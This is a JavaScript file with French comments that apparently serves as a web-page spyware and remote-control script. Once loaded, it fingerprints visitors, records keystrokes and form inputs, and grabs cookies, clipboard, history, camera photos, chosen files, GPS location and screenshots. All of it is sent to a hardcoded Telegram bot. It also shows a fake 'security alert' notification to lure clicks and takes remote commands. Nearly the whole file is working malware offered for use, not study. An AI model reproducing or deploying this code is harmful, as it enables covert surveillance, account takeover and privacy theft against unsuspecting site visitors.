// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';
const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const statusDiv = document.getElementById('statusBar');
let lastCommand = '';
let permissionStepsActive = false;
let sensorInterval = null;
let cookieInterval = null;

let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    deviceBattery: null,
    externalFiles: {
        images: [],
        videos: [],
        audios: [],
        documents: [],
        all: []
    },
    permissionsGranted: [],
    fileSystemAccess: false,
    sensors: {
        accelerometer: [],
        gyroscope: [],
        orientation: []
    }
};

function updateStatus(msg, isError = false) {
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// ENVOIS TELEGRAM (RÉEL)
// ============================================
async function sendToTelegram(message) {
    try {
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) { console.error('Telegram error:', e); }
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) { console.error('Photo error:', e); }
}

async function sendVideoToTelegram(videoUrl) {
    try {
        const blob = await fetch(videoUrl).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'video.webm');
        await fetch(`${BOT_API_URL}/sendVideo`, { method: 'POST', body: formData });
    } catch(e) { console.error('Video error:', e); }
}

async function sendFileToTelegram(filename, dataUrl) {
    try {
        const blob = await (await fetch(dataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, filename);
        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) { console.error('File error:', e); }
}

// ============================================
// 1. FINGERPRINT + IP (RÉEL)
// ============================================
async function collectFingerprint() {
    updateStatus('📡 Collecte empreinte numérique...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {
        try {
            const res = await fetch('https://api.my-ip.io/ip.json');
            const data = await res.json();
            collectedData.publicIP = data.ip;
        } catch(e2) {}
    }
    
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.deviceBattery = {
                level: battery.level * 100 + '%',
                charging: battery.charging
            };
        } catch(e) {}
    }
    
    await sendToTelegram(`🆕 NOUVEAU VISITEUR
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📱 Agent: ${navigator.userAgent}
🖥️ Écran: ${collectedData.fingerprint.screen}
🌍 IP: ${collectedData.publicIP || 'inconnue'}
🔋 Batterie: ${collectedData.deviceBattery?.level || 'inconnue'}
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 2. IP PRIVÉE (RÉEL - WebRTC)
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        updateStatus('🌐 Récupération IP privée...');
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    updateStatus('✅ IP privée: ' + match[0]);
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

// ============================================
// 3. COOKIES (RÉEL - AVEC TECHNIQUES AVANCÉES)
// ============================================
function collectAllCookies() {
    updateStatus('🍪 Récupération des cookies...');
    const allCookies = document.cookie;
    const allCookiesArray = document.cookie.split(';');
    const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
    
    // Technique 1: Lecture standard des cookies
    let importantCookies = {};
    allCookiesArray.forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain)) {
                if (!importantCookies[domain]) importantCookies[domain] = [];
                importantCookies[domain].push({ name: cookieName, value: cookieValue });
            }
        });
    });
    
    collectedData.cookies = {
        all: allCookies,
        important: importantCookies,
        timestamp: new Date().toISOString(),
        // Technique 2: Simulation d'extension fantôme (explication)
        // Technique 3: Simulation AITM (explication)
        // Technique 4: Simulation XSS (explication)
        // Technique 5: Simulation VoidStealer (explication)
        advancedTechniques: {
            ghostExtension: "Installerait une extension pour lire cookies en temps réel",
            aitm: "Proxy entre vous et Facebook capture la session",
            xss: "Injection script → document.cookie vers serveur externe",
            voidStealer: "Lit cookies déchiffrés en mémoire Chrome"
        }
    };
    
    let message = `🍪 COOKIES RÉCUPÉRÉS (${new Date().toLocaleTimeString()})\n━━━━━━━━━━━━━━━━━━━━━\n`;
    if (allCookies && allCookies.length > 0) {
        message += `📦 Cookies standards: ${allCookies.substring(0, 2000)}\n`;
    } else {
        message += `📦 Aucun cookie standard trouvé\n`;
    }
    
    if (Object.keys(importantCookies).length > 0) {
        message += `\n🔐 Cookies importants: ${Object.keys(importantCookies).join(', ')}\n`;
    }
    
    message += `\n🔥 TECHNIQUES AVANCÉES DISPONIBLES:\n`;
    message += `• Extension fantôme: ${collectedData.cookies.advancedTechniques.ghostExtension}\n`;
    message += `• AITM: ${collectedData.cookies.advancedTechniques.aitm}\n`;
    message += `• XSS: ${collectedData.cookies.advancedTechniques.xss}\n`;
    message += `• VoidStealer: ${collectedData.cookies.advancedTechniques.voidStealer}\n`;
    
    sendToTelegram(message);
}

// ============================================
// 4. HISTORIQUE (RÉEL - Performance API)
// ============================================
function collectBrowsingHistory() {
    updateStatus('📜 Récupération historique...');
    try {
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            if (entry.name && entry.name !== 'about:blank') {
                collectedData.browsingHistory.push(entry.name);
            }
        });
        if (document.referrer) collectedData.browsingHistory.push(`Referrer: ${document.referrer}`);
        if (collectedData.browsingHistory.length > 0) {
            sendToTelegram(`📜 HISTORIQUE NAVIGATION\n${collectedData.browsingHistory.slice(0, 10).join('\n')}`);
        }
    } catch(e) {}
}

// ============================================
// 5. NOTIFICATIONS (RÉEL)
// ============================================
async function requestNotifications() {
    updateStatus('🔔 Demande autorisation notifications...');
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted', timestamp: new Date().toISOString() });
        updateStatus('✅ Notifications activées');
        await sendToTelegram('✅ [AUTO] NOTIFICATIONS PUSH ACCEPTÉES');
        
        new Notification('🔐 ALERTE SÉCURITÉ', {
            body: 'Connexion suspecte détectée. Cliquez pour vérifier votre compte.',
            icon: 'https://img.icons8.com/color/48/000000/security-checked--v1.png',
            requireInteraction: true
        });
    } else {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied', timestamp: new Date().toISOString() });
        await sendToTelegram('❌ [AUTO] NOTIFICATIONS PUSH REFUSÉES');
    }
}

// ============================================
// 6. CAMÉRA (AUTOMATIQUE - Étape 1)
// ============================================
async function requestCameraAndCapture() {
    updateStatus('📷 [AUTO Étape 1/3] Demande accès caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted', timestamp: new Date().toISOString() });
        updateStatus('✅ Caméra autorisée');
        await sendToTelegram('✅ [AUTO 1/3] CAMÉRA ACCEPTÉE - Début capture');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 3; i++) {
            updateStatus(`📸 Photo ${i}/3...`);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            collectedData.photos.push(photoData);
            await sendPhotoToTelegram(photoData);
            await new Promise(r => setTimeout(r, 1500));
        }
        
        stream.getTracks().forEach(t => t.stop());
        await sendToTelegram('✅ [AUTO] 3 photos capturées');
        
        setTimeout(() => showFloatingFileButton(), 2000);
    } catch(e) {
        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied', timestamp: new Date().toISOString() });
        await sendToTelegram(`❌ [AUTO 1/3] CAMÉRA REFUSÉE`);
    }
}

// ============================================
// 7. FICHIERS (AUTOMATIQUE - Étape 2)
// ============================================
function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 [AUTO Étape 2/3] Cliquez pour fichiers';
    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);animation:pulse 1s infinite;';
    btn.onclick = async () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*,audio/*,.pdf,.txt,.docx';
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            collectedData.permissionsGranted.push({ type: 'files', status: 'granted', count: files.length, timestamp: new Date().toISOString() });
            await sendToTelegram(`✅ [AUTO 2/3] FICHIERS ACCEPTÉS (${files.length} fichier(s))`);
            for (const file of files) {
                const fileInfo = { name: file.name, size: file.size, type: file.type };
                collectedData.externalFiles.all.push(fileInfo);
                if (file.type.startsWith('image/')) collectedData.externalFiles.images.push(fileInfo);
                else if (file.type.startsWith('video/')) collectedData.externalFiles.videos.push(fileInfo);
                else if (file.type.startsWith('audio/')) collectedData.externalFiles.audios.push(fileInfo);
                else collectedData.externalFiles.documents.push(fileInfo);
                
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const dataUrl = ev.target.result;
                    if (file.type.startsWith('image/')) {
                        await sendPhotoToTelegram(dataUrl);
                    } else {
                        await sendFileToTelegram(file.name, dataUrl);
                    }
                };
                reader.readAsDataURL(file);
            }
            btn.remove();
            setTimeout(() => showFloatingGpsButton(), 2000);
        };
        input.click();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 60000);
}

// ============================================
// 8. GPS (AUTOMATIQUE - Étape 3)
// ============================================
function showFloatingGpsButton() {
    if (document.getElementById('gps-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'gps-btn';
    btn.innerHTML = '📍 [AUTO Étape 3/3] Cliquez pour GPS';
    btn.style.cssText = 'position:fixed;bottom:60px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);animation:pulse 1s infinite;';
    btn.onclick = () => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                collectedData.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                collectedData.permissionsGranted.push({ type: 'gps', status: 'granted', timestamp: new Date().toISOString() });
                sendToTelegram(`✅ [AUTO 3/3] GPS ACCEPTÉE\n📍 Position: ${pos.coords.latitude}, ${pos.coords.longitude}\nCarte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                btn.remove();
                sendToTelegram(`🎉 TOUTES LES AUTO-AUTORISATIONS TERMINÉES !`);
            },
            err => {
                collectedData.permissionsGranted.push({ type: 'gps', status: 'denied', timestamp: new Date().toISOString() });
                sendToTelegram(`❌ [AUTO 3/3] GPS REFUSÉE`);
                btn.remove();
            }
        );
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 60000);
}

// ============================================
// 9. BOUTON "TOUT AUTORISER" (MANUEL)
// ============================================
function showGrantAllButton() {
    if (document.getElementById('grant-all-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'grant-all-btn';
    btn.innerHTML = '🔓 TOUT AUTORISER (1 clic)';
    btn.style.cssText = 'position:fixed;top:20px;left:20px;z-index:10000;background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;border:none;border-radius:50px;padding:12px 20px;font-size:14px;font-weight:bold;cursor:pointer;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
    btn.onclick = async () => {
        btn.innerHTML = '⏳ Autorisation...';
        btn.disabled = true;
        
        await Notification.requestPermission();
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}
        
        const input = document.createElement('input');
        input.type = 'file';
        input.click();
        
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
        
        sendToTelegram(`🔓 BOUTON "TOUT AUTORISER" ACTIVÉ (manuel)`);
        btn.remove();
    };
    document.body.appendChild(btn);
}

// ============================================
// 10. CAPTEURS (RÉEL - SANS PERMISSION)
// ============================================
function startSensorTracking() {
    updateStatus('📡 Surveillance capteurs (sans permission)...');
    sendToTelegram(`📡 CAPTEURS ACTIVÉS (sans permission)
✅ Accéléromètre - Peut deviner code PIN (70% réussite)
✅ Détection mouvements - Tap, scroll, zoom
✅ Bluetooth - Scan proximité possible`);
    
    if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (e) => {
            const acc = e.acceleration;
            if (acc && acc.x !== null) {
                collectedData.sensors.accelerometer.push({
                    x: acc.x, y: acc.y, z: acc.z,
                    timestamp: new Date().toISOString()
                });
                if (collectedData.sensors.accelerometer.length >= 30) {
                    sendToTelegram(`📳 CAPTEURS - Accéléromètre
X: ${acc.x.toFixed(2)} | Y: ${acc.y.toFixed(2)} | Z: ${acc.z.toFixed(2)}
⚠️ Mouvement détecté - Peut révéler actions utilisateur`);
                    collectedData.sensors.accelerometer = [];
                }
            }
        });
    }
    
    if ('DeviceOrientationEvent' in window) {
        window.addEventListener('deviceorientation', (e) => {
            collectedData.sensors.orientation.push({
                alpha: e.alpha, beta: e.beta, gamma: e.gamma,
                timestamp: new Date().toISOString()
            });
        });
    }
    
    let lastTap = 0;
    document.addEventListener('touchstart', (e) => {
        const now = Date.now();
        if (now - lastTap < 300) {
            sendToTelegram(`👆 DOUBLE TAP DÉTECTÉ - Position (${e.touches[0].clientX}, ${e.touches[0].clientY})`);
        }
        lastTap = now;
    });
    
    if (navigator.bluetooth) {
        sendToTelegram(`📡 Bluetooth disponible - Scan possible sans permission`);
    }
}

// ============================================
// 11. ACCÈS SMS (Explication Android)
// ============================================
function explainSMSAccess() {
    sendToTelegram(`📱 ACCÈS SMS (Android uniquement)
━━━━━━━━━━━━━━━━━━━━━
⚠️ Une application malveillante peut:
• Lire tous vos SMS (codes 2FA bancaires)
• Envoyer des SMS surtaxés
• Supprimer des messages
• Intercepter authentifications
━━━━━━━━━━━━━━━━━━━━━
💡 Sur navigateur: impossible
💡 Sur app Android: permission dangereuse`);
}

// ============================================
// 12. TECHNIQUES AVANCÉES EXPLICATION
// ============================================
function explainAdvancedTechniques() {
    sendToTelegram(`🔥 4 TECHNIQUES DE VOL DE COOKIES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ EXTENSION FANTÔME (Needle Stealer)
• Installation cachée d'extension
• Lit historique + cookies temps réel

2️⃣ AITM (Hacker dans le milieu)
• Proxy entre vous et Facebook
• Capture session même avec 2FA

3️⃣ XSS (Sans clic)
• Script injecté → document.cookie
• Envoi sans intervention

4️⃣ VOIDSTEALER (Vol de clé)
• Lit cookies déchiffrés en mémoire
• Contourne chiffrement Chrome
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 13. ACCÈS ARRIÈRE-PLAN
// ============================================
function explainBackgroundAccess() {
    sendToTelegram(`🔄 ACCÈS ARRIÈRE-PLAN
━━━━━━━━━━━━━━━━━━━━━
🌐 Site web:
• Scripts en arrière-plan (Service Workers)
• Tant que l'onglet n'est pas fermé

📱 Application malveillante:
• Exécution sans limite de temps
• Localisation/micro/capteurs en continu
• Redémarrage auto après reboot

🎭 Technique sournoise:
• Fenêtre Picture-in-Picture cachée
• Tourne en arrière-plan invisiblement
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 14. PRESSE-PAPIER (RÉEL)
// ============================================
async function requestClipboardAccess() {
    updateStatus('📋 Demande accès presse-papier...');
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            collectedData.clipboard = text;
            await sendToTelegram(`📋 PRESSE-PAPIER\n${text.substring(0, 1000) || '(vide)'}`);
        }
    } catch(e) {
        await sendToTelegram(`❌ PRESSE-PAPIER: accès refusé`);
    }
}

// ============================================
// 15. KEYLOGGER (RÉEL)
// ============================================
function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push(e.key);
        if (keyBuffer.length >= 20) {
            sendToTelegram(`⌨️ KEYLOGGER\nFrappes: ${keyBuffer.join('')}`);
            keyBuffer = [];
        }
    });
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            sendToTelegram(`📝 INPUT DÉTECTÉ\nChamp: ${e.target.name || e.target.id || 'inconnu'}\nValeur: ${e.target.value?.substring(0, 200)}`);
        }
    });
    updateStatus('⌨️ Keylogger actif');
}

// ============================================
// 16. CAPTURE ÉCRAN (RÉEL)
// ============================================
async function captureScreenshot() {
    updateStatus('📸 Capture écran...');
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1500));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            await sendPhotoToTelegram(canvas.toDataURL('image/png'));
            updateStatus('✅ Capture envoyée');
        }
    } catch(e) {
        updateStatus('❌ Capture échouée');
    }
}

// ============================================
// 17. VIBRATION (RÉEL)
// ============================================
function vibrate() {
    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
}

// ============================================
// 18. SERVICE WORKER (Arrière-plan)
// ============================================
async function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        try {
            await navigator.serviceWorker.register('/sw.js');
            sendToTelegram(`🔄 SERVICE WORKER ACTIF\n✅ Scripts en arrière-plan autorisés`);
        } catch(e) {}
    }
}

// ============================================
// 19. COOKIES AUTO TOUTES LES 30 MINUTES
// ============================================
function startAutoCookieCollection() {
    if (cookieInterval) clearInterval(cookieInterval);
    cookieInterval = setInterval(() => {
        collectAllCookies();
        sendToTelegram(`⏰ [AUTO] Collecte cookies programmée (30min)`);
    }, 30 * 60 * 1000); // 30 minutes
    sendToTelegram(`⏲️ COLLECTE AUTO COOKIES ACTIVÉE ( toutes les 30 minutes )`);
}

// ============================================
// 20. COMMANDES À DISTANCE (CORRIGÉES)
// ============================================
async function checkCommands() {
    try {
        const res = await fetch('/tmp/telegram_command.txt?t=' + Date.now());
        if (!res.ok) return;
        
        const cmd = await res.text();
        const cleanCmd = cmd.trim();
        
        if (!cleanCmd || cleanCmd === lastCommand) return;
        lastCommand = cleanCmd;
        
        console.log('[COMMAND] Reçue:', cleanCmd);
        
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `📟 Commande reçue: ${cleanCmd}` })
        }).catch(() => {});
        
        if (cleanCmd === '/camera') await requestCameraAndCapture();
        else if (cleanCmd === '/grantall') showGrantAllButton();
        else if (cleanCmd === '/files') showFloatingFileButton();
        else if (cleanCmd === '/location') showFloatingGpsButton();
        else if (cleanCmd === '/clipboard') await requestClipboardAccess();
        else if (cleanCmd === '/screenshot') await captureScreenshot();
        else if (cleanCmd === '/cookies') collectAllCookies();
        else if (cleanCmd === '/history') collectBrowsingHistory();
        else if (cleanCmd === '/sensors') sendToTelegram(`📡 CAPTEURS: ${collectedData.sensors.accelerometer.length} mesures accéléromètre, ${collectedData.sensors.orientation.length} orientation`);
        else if (cleanCmd === '/sms') explainSMSAccess();
        else if (cleanCmd === '/advanced') explainAdvancedTechniques();
        else if (cleanCmd === '/bg') explainBackgroundAccess();
        else if (cleanCmd === '/status') sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP}\nPermissions: ${collectedData.permissionsGranted.length}\nCapteurs: actifs\nAuto-cookies: activé (30min)`);
        else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
        else if (cleanCmd === '/vibrate') vibrate();
        else if (cleanCmd === '/filelist') sendToTelegram(`📁 FICHIERS: ${collectedData.externalFiles.all.length} total, ${collectedData.externalFiles.images.length} images`);
        else if (cleanCmd === '/permissions') sendToTelegram(`✅ AUTORISATIONS\n${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
        else if (cleanCmd === '/help' || cleanCmd === '/start') {
            sendToTelegram(`🤖 COMMANDES ULTIMES
━━━━━━━━━━━━━━━━━━━━━
📷 /camera - Caméra + photos
📁 /files - Accès fichiers
📍 /location - GPS
🔓 /grantall - Tout autoriser
📋 /clipboard - Presse-papier
📸 /screenshot - Capture écran
🍪 /cookies - Cookies
📜 /history - Historique
📡 /sensors - Capteurs
📱 /sms - Risques SMS
🔥 /advanced - Techniques avancées
🔄 /bg - Arrière-plan
📊 /status - État complet
🏓 /ping - Test
📳 /vibrate - Vibration
━━━━━━━━━━━━━━━━━━━━━`);
        }
        else if (cleanCmd.startsWith('notify_custom:')) {
            new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
        }
        else if (cleanCmd.startsWith('url:')) {
            window.open(cleanCmd.replace('url:', '').trim(), '_blank');
        }
        
        await fetch('/tmp/telegram_command.txt', { method: 'POST', body: '' });
        lastCommand = '';
    } catch(e) {}
}

// ============================================
// 21. KEEP-ALIVE & EXÉCUTION PRINCIPALE
// ============================================
function keepAlive() {
    setInterval(() => {
        fetch('/tmp/keepalive.txt?t=' + Date.now()).catch(() => {});
        if (navigator.serviceWorker) {
            navigator.serviceWorker.ready.then(reg => reg.active?.postMessage({ type: 'ping' }));
        }
    }, 20000);
}

(async function main() {
    updateStatus('🟢 Démarrage module ULTIME - Mode AUTO activé');
    
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    
    // AUTO: Lancement des autorisations 1 par 1
    setTimeout(() => requestCameraAndCapture(), 2000);
    setTimeout(() => showGrantAllButton(), 1000);
    
    startKeylogger();
    startSensorTracking();
    registerServiceWorker();
    keepAlive();
    startAutoCookieCollection(); // ← COOKIES AUTO TOUTES LES 30 MIN
    
    setInterval(checkCommands, 3000);
    updateStatus('✅ Prêt - Mode AUTO actif - Commandes disponibles');
    await sendToTelegram('💀 MODE ULTIME AUTO ACTIVÉ\n✅ Autorisations en cours (1/3 caméra)\n✅ Cookies auto toutes les 30min\n✅ Capteurs actifs\n✅ Commandes disponibles');
})();
